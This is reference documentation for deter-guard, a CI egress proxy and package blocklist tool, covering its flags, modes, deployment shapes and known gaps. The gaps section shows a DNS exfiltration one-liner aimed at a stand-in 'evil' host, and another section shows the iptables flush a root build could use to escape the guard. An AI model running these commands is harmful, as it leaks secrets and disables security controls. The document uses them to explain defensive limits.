# Reference

Everything the [README](../README.md) doesn't need to say to get you running: flags, environment,
action inputs, the four ways to put the guard in front of a build, and what transparent mode costs.

Policy itself — rules, blocklist, keys, tokens — is managed at
[console.deter.dev](https://console.deter.dev), not here.

- [Commands and flags](#commands-and-flags)
- [Monitor mode](#monitor-mode)
- [Supply chain](#supply-chain)
- [Environment](#environment)
- [Action inputs](#action-inputs)
- [Versions](#versions)
- [Four ways to run it](#four-ways-to-run-it)
- [Transparent mode](#transparent-mode)
- [Other CI systems](#other-ci-systems)
- [Why `deter-guard env` exists](#why-deter-guard-env-exists)
- [Verifying the image](#verifying-the-image)
- [Not here yet](#not-here-yet)

## Commands and flags

`deter-guard --help` prints all of this; it is repeated here so you can search it.

| Command | |
| --- | --- |
| `exec [options] -- <cmd...>` | Run one command behind the proxy. Its exit code passes through. |
| `serve [options] [--wrap -- <cmd...>]` | Run the proxy on its own, so many commands sit behind one. |
| `env [options]` | Print the variables that point a build at a running proxy. |
| `whoami` | What this pipeline authenticates as. Run it first when something is wrong. |
| `policy` | Fetch, verify and write the Cedar policy. `--out <path>`, or stdout. |
| `claim` | Finish claiming an organization. Fails unless the platform itself signed the identity — a `dtrc_` token is a string somebody pasted into a variable, and settling a claim on one would prove nothing. On GitHub Actions use `uses: incubits/deter-guard/claim@v1`. |

**Common**

| | |
| --- | --- |
| `--console <url>` | Console base URL. `https://console.deter.dev` for the hosted console. |
| `--pubkey <hex>` | Pin the signing key. |
| `--out <path>` | `policy` only: write here instead of stdout. |
| `--audience <aud>` | OIDC audience. Default `deter-console`; must match the console. |
| `--project <ref>` / `--run <ref>` | For `dtrc_` tokens: what usage is attributed to, and the idempotency key so a retried job isn't counted twice. An OIDC session carries both already. |
| `--json` | Machine-readable output for `claim`, `whoami`, `policy`. |

**`exec` and `serve`**

| | |
| --- | --- |
| `--mode <mode>` | `enforce` (default) refuses. `monitor` decides and reports the same way, and lets the request through. See [Monitor mode](#monitor-mode). |
| `--policy <path>` | Enforce a local policy file instead of fetching one. **Unsigned**, and configures no reporting at all — it says so on every run. For testing and air-gapped runners. |
| `--no-supply-chain` | Do not pull or enforce the supply-chain blocklist. The egress policy is unaffected. |
| `--supply-chain <path>` | Use a local supply-chain document instead of the console's. **Unsigned**, and it says so. Accepts the raw document or the bundle JSON the console serves. |
| `--state-dir <dir>` | Where the CA and state file go. Default: a temp dir. |
| `--verbose` | Log allowed requests too, not just refusals. |

**`serve`**

| | |
| --- | --- |
| `--addr <ip>` | Listen address. Default `127.0.0.1`. Anything else publishes an intercepting proxy with no authentication, so it is warned about loudly. |
| `--port <n>` | Default `3128`. `0` lets the kernel pick. |
| `--ca-out <path>` | Write the CA here and leave it there on exit. |
| `--ready-file <p>` | Write the proxy URL here once the socket is actually accepting. |
| `--detach` | Background the proxy; return only once it is up. |
| `--wrap` | Run one command on a fixed port, then shut down. |

**`serve --transparent`** (Linux, root) — see [Transparent mode](#transparent-mode)

| | |
| --- | --- |
| `--transparent` | Filter redirected traffic. No proxy variables are involved at all. |
| `--redirect` | Install the `iptables` rules that send outbound :80/:443 here. |
| `--install-ca` | Trust the guard's CA system-wide, so intercepted TLS verifies. |
| `--no-ci-hosts` | Also enforce the policy against this runner's own control plane. |
| `--run-as <user>` | Run the `--wrap` command as this user, so it cannot undo the redirect. `user`, `uid`, or `user:group`. |
| `--exempt <cidrs>` | Comma-separated CIDRs never to intercept. IPv4 and IPv6 both. |
| `--transparent-http-port <n>` / `--transparent-tls-port <n>` | Default `3129` / `3130`. |

**`env`**

| | |
| --- | --- |
| `--format <fmt>` | `sh` (default), `github`, `docker`, `json`. |
| `--proxy <url>` / `--ca <path>` | Override. By default both are read from the running guard's state file. |
| `--unset` | Emit lines that *clear* the variables instead of setting them. |

## Monitor mode

The short version is in the [README](../README.md#monitor-first-then-enforce): `--mode monitor`
makes every decision the same way, reports it, and lets the request through, so a first run tells you
what a policy would refuse without failing the job.

A full run looks like this:

```
deter-guard: egress proxy on http://127.0.0.1:52054 · policy version 812 · 4 rule(s), 118 block(s) · mode monitor
deter-guard: MONITOR MODE: nothing will be blocked. Refusals are logged, reported and summarised at
the end of the run; the requests are made anyway.
deter-guard: WOULD-DENY GET telemetry.example.com/v1/events — host not permitted by the egress policy (monitor mode: allowed through)
...
deter-guard: MONITOR MODE SUMMARY: 12 request(s) across 3 target(s) WOULD have been refused (431 allowed by the policy). Nothing was blocked:
deter-guard:        9 × GET registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz — left-pad 1.3.0 is on your organization's blocklist
deter-guard:        2 × CONNECT telemetry.example.com:443 — host not permitted by the egress policy
deter-guard:        1 × GET telemetry.example.com/v1/events — host not permitted by the egress policy
deter-guard: permit whatever belongs in your egress policy, then run with --mode enforce to make
this real. Until then this job is NOT protected.
```

**One thing is refused in both modes:** a request the guard cannot identify — a malformed authority,
an undecodable path, a TLS connection with no SNI. There is no host to forward those to.

### On GitHub Actions

One input. Enforcing is the default, so monitoring is the thing you have to ask for:

```yaml
      - uses: incubits/deter-guard@v1
        with:
          pubkey: ${{ vars.DETER_POLICY_PUBKEY }}
          mode: monitor          # default: enforce
```

The job runs green, the log ends with the summary, and every host that would have been refused
appears as a **warning** annotation on the run — `Egress would be refused: WOULD-DENY GET …` — plus
one notice saying how many there were and that nothing was protected.

Flipping the whole organization is one variable rather than a pull request against every workflow:

```yaml
          mode: ${{ vars.DETER_MODE || 'enforce' }}
```

Set the repository or organization variable `DETER_MODE` to `monitor`, let a few real jobs run,
permit what belongs in the console — then delete the variable. Every pipeline goes back to enforcing
without a workflow edit, and the fallback is the safe one, so a variable that is unset, renamed, or
never created enforces rather than quietly stopping. A value the guard does not recognise **fails the
step** — a typo cannot land you in a mode you did not choose.

Outside the action: `--mode monitor` on `exec` and `serve`, or `DETER_MODE=monitor` in the
environment. The action passes the input through as a flag, which wins over `DETER_MODE`, so set the
input rather than the variable there.

## Supply chain

The short version is in the [README](../README.md#blocking-malicious-and-vulnerable-packages): the
guard pulls a second signed document — the packages your organization refuses to install — and
decides every tarball fetch against it. On by default wherever there is a console to pull it from.

### It fails open, loudly

The egress policy fails closed. This document is the opposite, deliberately: it changes every fifteen
minutes as feeds move, and a console outage must not break every `npm ci` you run. Every failure
degrades package blocking, says so, and leaves the egress policy untouched.

| | |
| --- | --- |
| Nothing published for your organization | One line. Package blocking is not in force. |
| Console unreachable, or the pull fails | A warning. The build runs. |
| Signature does not verify | A loud warning, and the document is **not** enforced. |
| No key to verify against | Not enforced. Pin `--pubkey`, or use OIDC, which reports the key at exchange time. |
| The document is older than your threshold | Enforced anyway, with a warning naming its age — unless your organization set `on_stale=block_registry`, which refuses the registry instead. |

### Posture is in the document, not the guard

Thresholds, which classes enforce and which only report, the CISA KEV override, mirror prefixes — all
of it is in the document's header. Moving your organization from `high` to `critical`, or excusing
one pipeline, is a new document rather than a new guard release. It is configured per surface in the
console: CI and developer laptops are separate rows, because a red build is loud and fixed in minutes
while a false block on a laptop stops someone working.

`--mode monitor` outranks all of it: nothing is blocked on that run, whatever the document says.
Independently, one class can be on `monitor` while another enforces — and an advisory with **no
fixed version** is reported rather than blocked by default, because blocking a package with nowhere
to upgrade to is how a control gets switched off wholesale instead of tuned. Those findings are
counted separately in the end-of-run summary, so an enforcing run never implies it stopped something
it let through.

### The refusal body

```json
{
  "error": "package_blocked",
  "decision": "deny_supply_chain",
  "host": "registry.npmjs.org",
  "reason": "vite@6.2.1 is blocked — GHSA-4r4m-qw57-chr8 (MODERATE): confirmed exploited in the wild (CISA KEV). Fixed in 6.2.4",
  "package": "vite",
  "package_version": "6.2.1",
  "advisory": "GHSA-4r4m-qw57-chr8",
  "severity": "moderate",
  "fixed_in": "6.2.4",
  "kev": true,
  "blocked_because": "kev",
  "policy_version": 1787493039,
  "blocklist_version": 1789234440,
  "fix": "upgrade to 6.2.4 — or, if that is not possible yet, ask an admin for an exception under Supply chain in the deter console"
}
```

`X-Deter-Package`, `X-Deter-Advisory` and `X-Deter-Fixed-In` carry the same facts on the response.

## Environment

| Env | Flag | |
| --- | --- | --- |
| `DETER_CONSOLE_URL` | `--console` | Console base URL. Required. |
| `DETER_POLICY_PUBKEY` | `--pubkey` | Pin the signing key. Strongly recommended. |
| `DETER_ID_TOKEN` | | An OIDC ID token you supply (GitLab and friends). |
| `DETER_CI_TOKEN` | | A long-lived `dtrc_` token. Fallback only. |
| `DETER_CI_OIDC_AUDIENCE` | `--audience` | Default `deter-console`. Must match the console. |
| `DETER_PROJECT` | `--project` | Project id, for a `dtrc_` token. |
| `DETER_RUN_ID` | `--run` | Run id — deduplicates usage across retries. |
| `DETER_MODE` | `--mode` | `enforce` (default) or `monitor`. |
| `DETER_POLICY_FILE` | `--policy` | Enforce a local, **unsigned** policy file. |
| `DETER_NO_SUPPLY_CHAIN` | `--no-supply-chain` | Do not block malicious or vulnerable packages at all. |
| `DETER_SUPPLY_CHAIN_FILE` | `--supply-chain` | Use a local, **unsigned** supply-chain document instead of the console's. |
| `DETER_STATE_DIR` | `--state-dir` | Where the CA and state file go. |
| `DETER_GUARD_ADDR` | `--addr` | `serve` listen address. Default `127.0.0.1`. |
| `DETER_GUARD_PORT` | `--port` | `serve` listen port. Default `3128`. |
| `DETER_GUARD_CA_OUT` | `--ca-out` | Where `serve` writes the CA, and leaves it. |
| `DETER_RUN_AS` | `--run-as` | Run the `--wrap` command as this user. Transparent mode's containment depends on it. |
| `DETER_GUARD_ROOTS` | | Roots for the guard's *own* TLS: `both` (default), `system`, `embedded`. |

**Credentials are tried in order:** `DETER_ID_TOKEN` → GitHub Actions OIDC → `DETER_CI_TOKEN`. If the
OIDC exchange is *rejected* (wrong audience, owner not claimed) the guard does **not** fall back to a
`dtrc_` token — that would hide a real misconfiguration behind a different credential.

**`DETER_GUARD_ROOTS`** controls only the guard's own outbound TLS, never what the build may reach.
The binary embeds Mozilla's root set so copying it into a slim image with no CA bundle doesn't
silently break it. The default `both` unions those with the host's store — so a root the host
deliberately distrusted stays trusted here until the guard is rebuilt. Use `system` to honour only
the host's trust decisions, or `embedded` for a set that doesn't vary with the base image.

## Action inputs

| Input | Default | |
| --- | --- | --- |
| `console` | `https://console.deter.dev` | Console base URL. Set it only if you run your own. Ignored when `policy` is set. |
| `pubkey` | — | Pin the policy signing key (hex). **Strongly recommended.** |
| `mode` | `enforce` | `monitor` reports what the policy *would* refuse and blocks nothing. See [Monitor mode](#monitor-mode). |
| `transparent` | `false` | Intercept at the kernel instead of via proxy variables. |
| `policy` | — | Local **unsigned** policy file to enforce instead of fetching one. |
| `image` | matches the action's own ref | Image to take the binary from. Set it only to pull from a mirror of your own. |
| `verify-attestation` | `true` | Verify the image's build provenance before using it. |
| `supply-chain` | `true` | Block packages your organization's blocklist refuses. See [Supply chain](#supply-chain). |
| `verbose` | `false` | Log allowed requests too, not just refusals. |
| `project` / `run-id` | — | For `dtrc_` tokens. Ignored when OIDC is available. |
| `token` | `github.token` | Used to pull the image and verify its attestation. |

The action is JavaScript with no npm dependencies and no bundler, so what you review in this
repository is exactly what runs on the runner. It is not a composite action for one reason:
composite actions cannot declare a `post:` step, and teardown is not a nicety — refusals flush on
`SIGTERM`, so a guard the runner simply reaps enforces perfectly and reports nothing.

## Versions

The action and the image are one release, cut from one commit. **Pinning the action pins the binary
it runs** — the default `image` is derived from the ref you wrote after the `@`, so there is no
floating tag hiding behind a version number.

| You write | You get | |
| --- | --- | --- |
| `@v1` | newest 1.x | Fixes and features arrive on their own. Nothing breaking. |
| `@v1.4` | newest 1.4.x | Patches only. |
| `@v1.4.2` | exactly that | Reproducible. Update it deliberately. |
| `@<commit sha>` | exactly that | The strongest pin. Resolves to the `sha-<short>` image. |
| `@main` | tip of trunk | Untagged and unreleased. For trying something out. |

Image tags follow the same shape, plus `:latest`, which is the **newest release** — not the tip of
`main`, which is `:main`:

```
ghcr.io/incubits/deter-guard:latest   # newest release — what the examples here use
ghcr.io/incubits/deter-guard:1        # newest 1.x, so a major bump never arrives unannounced
ghcr.io/incubits/deter-guard:1.4.2    # exactly that
ghcr.io/incubits/deter-guard@sha256:… # a digest, from the release notes
```

The examples in these docs use `:latest` for the image and `@v1` for the action, which is not the
inconsistency it looks like. A workflow can only resolve a branch, a tag, or a SHA, and there is no
`latest` **tag** — `uses: …@latest` fails to resolve — while the registry does have a `:latest`. When
you want the run reproducible, pin both: `@v1.4.2` and the digest from the release notes.

Versions are semver, and the major number is a promise about the action inputs, the CLI flags and the
environment variables — the surfaces you have written down somewhere. Every release is a
[GitHub release](https://github.com/incubits/deter-guard/releases) with generated notes and the image
digest.

## Four ways to run it

Differing in how hard it is for the build to get around:

| | | Build can bypass it? |
| --- | --- | --- |
| 1 | Wrap each command — `exec` | yes, by not using the proxy |
| 2 | One proxy, many commands — `serve` | yes, by ignoring the variables |
| 3 | A sidecar that owns the network | no, if it has no other route |
| 4 | `--transparent --run-as <user>` in one container | no |
| 4b | `--transparent` with a root build | **yes** — the build can flush the rules |

**Shapes 1 and 2 are filtering, not containment.** Shape 4 is usually the right answer: it gets
shape 3's property inside a single container, at the cost of needing Linux and root.

**Shape 4 is only containment if the build is unprivileged.** The redirect is enforced by the kernel
against everyone except a process holding `CAP_NET_ADMIN` — and a build running as root in that
container holds it, so `iptables -t nat -F DETER_GUARD` is all it takes. `serve --wrap --run-as
<user> -- <command>` starts the guard as root and the build as somebody else: the build inherits the
network namespace, so the rules apply to it, but not the capability, so it cannot remove them. That
drop *is* the control. Without `--run-as` the guard says so at startup rather than implying a
containment it is not providing.

### 1. Wrap each command — `exec`

```dockerfile
FROM node:22-slim
COPY --from=ghcr.io/incubits/deter-guard:latest /deter-guard /usr/local/bin/deter-guard
RUN deter-guard exec -- npm ci
```

Simplest, scoped to exactly the command you name. Costs a prefix on every line.

### 2. One proxy, many commands — `serve`

For a developer image where people run whatever they like, put the guard at PID 1 and let everything
inherit it:

```dockerfile
FROM node:22-slim
COPY --from=ghcr.io/incubits/deter-guard:latest /deter-guard /usr/local/bin/deter-guard

# A FIXED port and CA path, so these can be baked in — which is what makes
# `docker exec` into a running container covered too, not just the CMD.
ENV DETER_GUARD_PORT=3128 DETER_GUARD_CA_OUT=/etc/deter/ca.pem

# Paste the generated ENV block here (see below).

ENTRYPOINT ["deter-guard", "serve", "--wrap", "--"]
CMD ["bash"]
```

Generate that block rather than copying one from here — the variable list grows, and a stale copy
fails as a certificate error deep inside a package manager rather than as a configuration problem.
There's no running guard at image-build time, so name the port and CA path explicitly:

```bash
deter-guard env --format docker \
  --proxy http://127.0.0.1:3128 --ca /etc/deter/ca.pem
```

The same idea in CI without a container:

```yaml
- run: deter-guard serve --detach
- run: deter-guard env --format github >> "$GITHUB_ENV"
- run: pnpm install --frozen-lockfile
- run: pnpm build
- run: pkill -TERM deter-guard || true   # lets it flush its report
  if: always()
```

Shut it down rather than letting the job reap it — refusals flush on `SIGTERM`.

### 3. A sidecar that owns the network

Run the guard in its own container and give the build container no route out except through it
(`network_mode: service:guard` in Compose, or one Pod with two containers). The build can't stop the
proxy, rewrite its rules, or unset its way around it, because none of it is in its container.

```yaml
services:
  guard:
    image: ghcr.io/incubits/deter-guard:latest
    command: ["serve", "--addr", "0.0.0.0", "--port", "3128", "--ca-out", "/shared/ca.pem"]
    volumes: ["shared:/shared"]
  build:
    image: your-build-image
    network_mode: "service:guard"
    volumes: ["shared:/shared"]
```

`--addr 0.0.0.0` publishes an intercepting proxy with no authentication, so the guard warns every
time. Publish it to one build's network, never a shared one.

### 4. Transparent

Add `--transparent --redirect --install-ca` to shape 2. The kernel redirects traffic before any
process is consulted, so nothing can opt out — shape 3's property without a second container.

## Transparent mode

```bash
deter-guard serve --transparent --redirect --install-ca --run-as build -- ./ci.sh
```

The kernel redirects outbound 80 and 443 to the guard before any process gets a say, the CA goes into
the system trust store, and the destination is read from the traffic itself (TLS SNI, or the `Host`
header on port 80). A connection with no SNI can't be identified, so it's refused — default deny
covers "I can't tell what this is" as well as "I know, and no".

On GitHub Actions, set `transparent: true`; hosted runners provide the passwordless sudo it needs.

Four things to know before turning it on:

- **Your runner's control plane is permitted automatically.** A policy that forgot `github.com`
  wouldn't just fail the build — it would stop the runner reporting that it had, and the job would
  die mute. Those hosts are listed at startup; `--no-ci-hosts` enforces the policy against them too.
- **Everything on the machine trusts a CA we minted, for the length of the job.** Generated in
  memory, valid 24 hours, on disk only in the file we install, removed on exit. Fair on an ephemeral
  runner, bad on a shared workstation.
- **IPv4 and IPv6 are both covered.** An IPv4-only chain is not partial coverage on a dual-stack
  runner — any host with a `AAAA` record is reached over IPv6 and never touches a rule the guard
  wrote. If this host has routable IPv6 and the `ip6tables` chain cannot be installed, the guard
  **refuses to start** rather than enforce a policy with a silent hole in it.
- **Cloud metadata is filtered like any other host.** `169.254.169.254` serves instance credentials
  over plain HTTP, which makes it the highest-value destination on a CI runner and exactly the one an
  egress policy should have an opinion about, so it is subject to default deny. A runner that
  genuinely needs it either permits it in policy or passes `--exempt 169.254.169.254/32`.

Node ships its own roots and ignores the system trust store, so `NODE_EXTRA_CA_CERTS` is set even
here. `deter-guard env` covers it.

## Other CI systems

### GitLab CI

GitLab requires the job to *declare* its ID token, so pass it as `DETER_ID_TOKEN`:

```yaml
build:
  image: ghcr.io/incubits/deter-guard:latest
  id_tokens:
    DETER_ID_TOKEN: { aud: "deter-console" }
  variables:
    DETER_CONSOLE_URL: https://console.deter.dev
    DETER_POLICY_PUBKEY: $DETER_POLICY_PUBKEY
  script:
    - deter-guard exec -- npm ci
```

### Jenkins, on-prem, air-gapped

Mint a CI token at [console.deter.dev](https://console.deter.dev) → **CI protection → CI tokens**:

```bash
docker run --rm \
  -e DETER_CONSOLE_URL=https://console.deter.dev \
  -e DETER_CI_TOKEN="$DETER_CI_TOKEN" \
  -e DETER_POLICY_PUBKEY="$DETER_POLICY_PUBKEY" \
  -v "$PWD:/workspace" \
  ghcr.io/incubits/deter-guard:latest \
  policy --project "$JOB_NAME" --run "$BUILD_TAG" --out /workspace/egress.cedar
```

For a `dtrc_` token, `--project` attributes usage and `--run` is the idempotency key, so a retried
job isn't counted twice. An OIDC session carries both already.

### Running the guard by hand on GitHub Actions

```yaml
- run: |
    deter-guard serve --detach --state-dir "$RUNNER_TEMP/deter"
    deter-guard env --state-dir "$RUNNER_TEMP/deter" --format github >> "$GITHUB_ENV"
  env:
    DETER_CONSOLE_URL: https://console.deter.dev
    DETER_POLICY_PUBKEY: ${{ vars.DETER_POLICY_PUBKEY }}
```

Two things the action does that you now have to do yourself:

1. Add an `if: always()` step that SIGTERMs the guard. Refusals flush on `SIGTERM`, so a guard the
   runner reaps at job end enforces perfectly and reports **nothing** — you keep enforcement and
   silently lose the audit trail, with an identical-looking build result.
2. Set `NODE_USE_ENV_PROXY=1`, or corepack downloads your package manager around the proxy.

## Why `deter-guard env` exists

The build is pointed at the proxy through fourteen variables across seven ecosystems: `HTTP_PROXY`
and friends, plus `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`, `PIP_CERT`, `CURL_CA_BUNDLE`,
`GIT_SSL_CAINFO`, `SSL_CERT_FILE`, and `CARGO_HTTP_CAINFO`. Missing one shows up as an inscrutable
certificate error deep inside a package manager. `env` prints the current list, so a copy in your
repo can't go stale:

```bash
eval "$(deter-guard env)"                      # this shell and everything it starts
deter-guard env --format github >> "$GITHUB_ENV"
deter-guard env --format docker                # paste into a Dockerfile
eval "$(deter-guard env --unset)"              # put the shell back
```

## Verifying the image

Built by GitHub Actions with a provenance attestation:

```bash
gh attestation verify oci://ghcr.io/incubits/deter-guard:latest --repo incubits/deter-guard
```

Pin `sha-<commit>`, or the digest from the release notes, for an immutable reference.

> **Maintainers:** a GHCR package published by Actions starts **private**, even from a public
> repository — it does not inherit repo visibility. Until it's switched, an anonymous `docker pull`
> gets a `401`. Flip it once, in
> [Packages → deter-guard → Package settings → Change visibility](https://github.com/orgs/incubits/packages/container/deter-guard/settings).

## Not here yet

- **DNS policy.** Transparent mode redirects TCP 80 and 443, so a build can't reach a refused host
  over HTTP — but it can still resolve names, and a resolver is a channel. Nothing stops
  `dig $(base64 secret).evil.example.com` today.
- **Ports other than 80 and 443.** A registry on :8443, `git+ssh`, or anything speaking its own
  protocol goes past the redirect. The rules are two lines; knowing what to do with the traffic once
  it arrives is not.
- **Certificate pinning.** Anything that pins a certificate breaks under interception by design.
  There's no way to filter it, and no allowlist for tunnelling it through uninspected yet.
- **Ecosystems other than npm.** The [supply-chain document](#supply-chain) is ecosystem-prefixed and
  the corpus is npm today, so PyPI, crates.io and Maven fetches are decided by the egress policy
  alone. The wire format already carries the prefix; the tarball-path grammar for each is the work.
- **Lockfile auditing.** Package blocking happens where packages are *fetched*, so a dependency
  already in the store is never presented for a decision. An `audit` mode that reads the lockfile up
  front — and reports findings as SARIF rather than as a failed install — is the other half.

Open work and known gaps in more detail: [TODO.md](../TODO.md).
